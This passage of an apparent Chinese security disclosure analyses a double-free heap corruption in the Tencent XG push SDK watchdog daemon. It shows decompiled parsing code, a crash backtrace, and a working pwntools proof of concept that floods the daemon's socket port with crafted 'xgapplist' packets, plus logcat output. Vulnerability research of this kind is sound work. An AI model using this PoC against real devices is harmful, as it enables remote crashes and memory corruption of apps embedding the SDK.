&nbsp; &nbsp; d24 0000000000000000 &nbsp;d25 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d26 0000000000000000 &nbsp;d27 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d28 0000000000000000 &nbsp;d29 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d30 0000000000000000 &nbsp;d31 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; scr 00000010<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243):<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): backtrace:<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; #00 &nbsp;pc 0002aab0 &nbsp;/system/lib/libc.so (strtoimax+31)<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; #01 &nbsp;pc 000015e1 &nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; #02 &nbsp;pc 00002787 &nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; #03 &nbsp;pc 0000124f &nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; #04 &nbsp;pc 0000e34b &nbsp;/system/lib/libc.so (__libc_init+50)<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; #05 &nbsp;pc 00001390 &nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243):<br style="text-align: left;"/></span></p></pre><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x05 double free内存破坏</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">仍然观察xgapplist命令，程序接收socket端口传入的命令xgapplist:&lt;packagename&gt;,&lt;accid&gt;;&lt;packgename2&gt;,&lt;accid2&gt;;…;&lt;packagenamen&gt;,&lt;accidn&gt;; 时，程序会对上述命令进行解析，分配xgappinfo对象，并依次将不重复的xgappinfo（使用XG SDK的app的信息）对象存入全局数组xgappinfo_list</span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">xgappinfo占用16字节，为如下结构体</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">struct&nbsp;xgappinfo&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;accid,
&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;packgename,
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;status
};</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">如图，</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t01eac43ff0eae9be12.png" title="t01eac43ff0eae9be12.png" alt="http://p5.qhimg.com/t01eac43ff0eae9be12.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">再来看下下面这段程序逻辑，对通过socket端口传入的xgapplist命令的解析主要包括以下几个步骤：</span></p><ul style="box-sizing: inherit; border: 0px; font-family: inherit; font-style: inherit; font-weight: inherit; margin-bottom: 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; list-style-position: initial; list-style-image: initial;" class=" list-paddingleft-2"><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">解析分号的分隔，获得每个xg&nbsp;app的信息；</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">解析逗号的分隔，获得xg&nbsp;app packagename和accid；</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">从0x4005E028开始，依次存储解析xgappinfo得到的结果，分别为accid、packagename、status，从而构成xgappinfo_list；</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">当再次传入xgapplist命令时，会将传入的packagename与已存储的packagename比较。如果不同，说明是新的packagename，则会在堆上分配地址存储，并将这个堆上分配的地址添加到xgappinfo_list中。如果相同，不进行添加。</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">最多只能添加到0x40060028这个地址，到这个地址会跳出循环，也就是最多只能添加(0x40060028-0x4005E028)/16=512个xgappinfo结构体</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p></li><li><pre class="brush:bash;toolbar:false">void&nbsp;__fastcall&nbsp;sub_40056574(char&nbsp;*a1)
{
&nbsp;&nbsp;…
&nbsp;int&nbsp;i;&nbsp;//&nbsp;[sp+24h]&nbsp;[bp-2Ch]@4
&nbsp;&nbsp;unsigned&nbsp;__int64&nbsp;v27;&nbsp;//&nbsp;[sp+28h]&nbsp;[bp-28h]@8
&nbsp;&nbsp;v1&nbsp;=&nbsp;a1;
&nbsp;&nbsp;j_j_memset(dword_40060028,&nbsp;0,&nbsp;0x200u);
&nbsp;&nbsp;v2&nbsp;=&nbsp;j_j_strtok(v1,&nbsp;“;”);
&nbsp;&nbsp;v3&nbsp;=&nbsp;0;
&nbsp;&nbsp;v4&nbsp;=&nbsp;v2;
&nbsp;&nbsp;while&nbsp;(&nbsp;1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;v25&nbsp;=&nbsp;v3;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v4&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;j_j_strlen(v4);
&nbsp;&nbsp;&nbsp;&nbsp;v6&nbsp;=&nbsp;v5&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;(void&nbsp;*)j_operator&nbsp;new[](v5&nbsp;+&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;dword_40060028[v25]&nbsp;=&nbsp;v7;
&nbsp;&nbsp;&nbsp;&nbsp;j_j_memcpy(v7,&nbsp;v4,&nbsp;v6);
&nbsp;&nbsp;&nbsp;&nbsp;v4&nbsp;=&nbsp;j_j_strtok(0,&nbsp;“;”);
&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;v25&nbsp;+&nbsp;1;
&nbsp;&nbsp;}
&nbsp;&nbsp;for&nbsp;(&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;v25;&nbsp;++i&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;v8&nbsp;=&nbsp;(char&nbsp;*)dword_40060028[i];
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;sub_4005651C(dword_40060028[i])&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;j_j_strtok(v8,&nbsp;“,”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v10&nbsp;=&nbsp;j_j_strtok(0,&nbsp;“,”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v11&nbsp;=&nbsp;v10;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v12&nbsp;=&nbsp;j_j_atoll(v10);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v27&nbsp;=&nbsp;v12;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v12&nbsp;&lt;=&nbsp;0x3B9AC9FF&nbsp;&amp;&amp;&nbsp;dword_4005D018&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v23&nbsp;=&nbsp;HIDWORD(v12);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j___android_log_print(6,&nbsp;“xguardian”,&nbsp;“error&nbsp;accessid:%llu”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v9&nbsp;&amp;&amp;&nbsp;v11&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;&amp;dword_4005E028;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;xgapp_info结构体存储的起始地址
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;j&nbsp;=&nbsp;&amp;dword_4005E028;&nbsp;;&nbsp;j&nbsp;=&nbsp;v15&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v14&nbsp;=&nbsp;(const&nbsp;char&nbsp;*)v13[2];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v15&nbsp;=&nbsp;v13;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v14&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!j_j_strcmp(v9,&nbsp;v14)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*v13&nbsp;=&nbsp;v27;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13[1]&nbsp;=&nbsp;HIDWORD(v27);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v16&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_BYTE&nbsp;*)v15&nbsp;+&nbsp;12)&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v15&nbsp;=&nbsp;j;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_22;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*((_BYTE&nbsp;*)v13&nbsp;+&nbsp;12)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v15&nbsp;=&nbsp;j;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;+=&nbsp;4;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v13&nbsp;==&nbsp;dword_40060028&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;最多只能存储512个对象，每个对象占用16字节
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v16&nbsp;=&nbsp;0;
LABEL_22:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;dword_4005D018&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j___android_log_print(4,&nbsp;“xguardian”,&nbsp;“found&nbsp;%d,&nbsp;pkgName:%s,accid:%s”,&nbsp;v16,&nbsp;v9,&nbsp;v11);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v16&nbsp;&amp;&amp;&nbsp;sub_40055B98(v9)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;dword_4005D018&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j___android_log_print(4,&nbsp;“xguardian”,&nbsp;“try&nbsp;to&nbsp;add&nbsp;to&nbsp;the&nbsp;unstall&nbsp;list”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v17&nbsp;=&nbsp;j_j_strlen(v9)&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v18&nbsp;=&nbsp;(void&nbsp;*)v15[2];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v18&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
j_j__ZdaPv:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;operator&nbsp;delete[](v18);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这段存在问题，v18没有置为null。导致当循环到512个对象的时候，由于前面循环的限制，v18还是指向第512个对象中在堆上分配的packagename的地址，此时v18会被delete。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;当512以上的多个命令数据包达到，需要有多个packagename需要添加时，由于并发处理，程序会在返回之前再次运行到此处，v18还是指向同一地址，由于v18已被delete，此时会再次delete一下，从而导致delete出错
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v19&nbsp;=&nbsp;(void&nbsp;*)j_operator&nbsp;new[](v17);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v15[2]&nbsp;=&nbsp;(int)v19;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j_memset(v19,&nbsp;0,&nbsp;v17);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j_memcpy((void&nbsp;*)v15[2],&nbsp;v9,&nbsp;v17);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_BYTE&nbsp;*)(v15[2]&nbsp;+&nbsp;v17)&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v20&nbsp;=&nbsp;j_j_atoll(v11);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_BYTE&nbsp;*)v15&nbsp;+&nbsp;12)&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_QWORD&nbsp;*)v15&nbsp;=&nbsp;v20;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;dword_4005D018&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j___android_log_print(4,&nbsp;“xguardian”,&nbsp;“add&nbsp;new&nbsp;unInfo&nbsp;pkgName:%s,accid:%llu”,&nbsp;v15[2],&nbsp;v20);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;v18&nbsp;=&nbsp;(void&nbsp;*)dword_40060028[i];
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v18&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;j_j__ZdaPv;
&nbsp;&nbsp;}
…</pre></li></ul><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注意下面这段代码，</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">if&nbsp;(&nbsp;v18&nbsp;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
j_j__ZdaPv:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;operator&nbsp;delete[](v18);&nbsp;&nbsp;
}</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">v18为下一个未分配区域的packagename，XG SDK认为如果不为空，则表明已在堆上分配，因此需要delete。然而测试表明，当添加xgappinfo超过512，为518、519等多个时（注意：并非超过1个），可以触发堆内存破坏。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">POC:
&nbsp;from&nbsp;pwn&nbsp;import&nbsp;*
import&nbsp;sys
def&nbsp;open_connection():
&nbsp;&nbsp;&nbsp;&nbsp;xg_daemon_server&nbsp;=&nbsp;“192.168.8.158”
&nbsp;&nbsp;&nbsp;&nbsp;xg_listen_port&nbsp;=&nbsp;55362
&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;=&nbsp;remote(xg_daemon_server,&nbsp;xg_listen_port)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;conn
def&nbsp;send_debug():
&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;=&nbsp;open_connection()
&nbsp;&nbsp;&nbsp;&nbsp;packet_debug&nbsp;=&nbsp;“debug:1\n”
&nbsp;&nbsp;&nbsp;&nbsp;conn.send(packet_debug)
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“S:”+packet_debug
&nbsp;&nbsp;&nbsp;&nbsp;conn.close()
&nbsp;&nbsp;&nbsp;&nbsp;exit(0)
def&nbsp;send_heap_overflow(n):
&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;=&nbsp;open_connection()
&nbsp;&nbsp;&nbsp;&nbsp;packet_bound_overflow&nbsp;=&nbsp;“xgapplist:../../../”
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(n):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;packet_bound_overflow&nbsp;+=”/”
&nbsp;&nbsp;&nbsp;&nbsp;packet_bound_overflow&nbsp;+=”sdcard/,&nbsp;2100178385\n”
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“S:&nbsp;“+packet_bound_overflow
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“%d&nbsp;bytes”&nbsp;%&nbsp;len(packet_bound_overflow)
&nbsp;&nbsp;&nbsp;&nbsp;conn.send(packet_bound_overflow)
&nbsp;&nbsp;&nbsp;&nbsp;conn.close()
def&nbsp;send_normal_packet(packet):
&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;=&nbsp;open_connection()
&nbsp;&nbsp;&nbsp;&nbsp;conn.send(packet)
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“S:&nbsp;“+packet
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(packet&nbsp;==&nbsp;“ver:\n”):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“R:&nbsp;“+&nbsp;conn.recv()
&nbsp;&nbsp;&nbsp;&nbsp;conn.close()
&nbsp;&nbsp;&nbsp;&nbsp;exit(0)
def&nbsp;main():
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(len(sys.argv)&nbsp;!=&nbsp;2):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“””
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%s&nbsp;&lt;packet_type&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1:&nbsp;send&nbsp;debug&nbsp;packet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3:&nbsp;send&nbsp;heap&nbsp;overflow&nbsp;packet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4:&nbsp;send&nbsp;normal&nbsp;ver:&nbsp;packet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5:&nbsp;send&nbsp;normal&nbsp;tme:12345&nbsp;packet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6:&nbsp;send&nbsp;normal&nbsp;xgapplist:&nbsp;packet
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“””&nbsp;%&nbsp;sys.argv[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1)
&nbsp;&nbsp;&nbsp;&nbsp;if(sys.argv[1]&nbsp;==&nbsp;“1”):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_debug()
&nbsp;&nbsp;&nbsp;&nbsp;elif(sys.argv[1]&nbsp;==&nbsp;“3”):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(518):&nbsp;&nbsp;//notice！
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_heap_overflow(i)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;i
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0)
&nbsp;&nbsp;&nbsp;&nbsp;elif(sys.argv[1]&nbsp;==&nbsp;“4”):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_normal_packet(“ver:\n”)
&nbsp;&nbsp;&nbsp;&nbsp;elif(sys.argv[1]&nbsp;==&nbsp;“5”):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_normal_packet(“tme:12345\n”)
&nbsp;&nbsp;&nbsp;&nbsp;elif(sys.argv[1]&nbsp;==&nbsp;“6”):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_normal_packet(“xgapplist:\n”)
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;“unkown&nbsp;packet&nbsp;type!&nbsp;“
if&nbsp;__name__&nbsp;==&nbsp;“__main__”:
&nbsp;&nbsp;&nbsp;&nbsp;main()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Logcat
&nbsp;
I/TpnsWatchdog(&nbsp;&nbsp;495):&nbsp;server&nbsp;get&nbsp;unstall&nbsp;appinfo:com.tencent.wework,2100178384;../../../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
I/TpnsWatchdog(&nbsp;&nbsp;495):&nbsp;found&nbsp;0,&nbsp;pkgName:com.tencent.wework,accid:2100178384
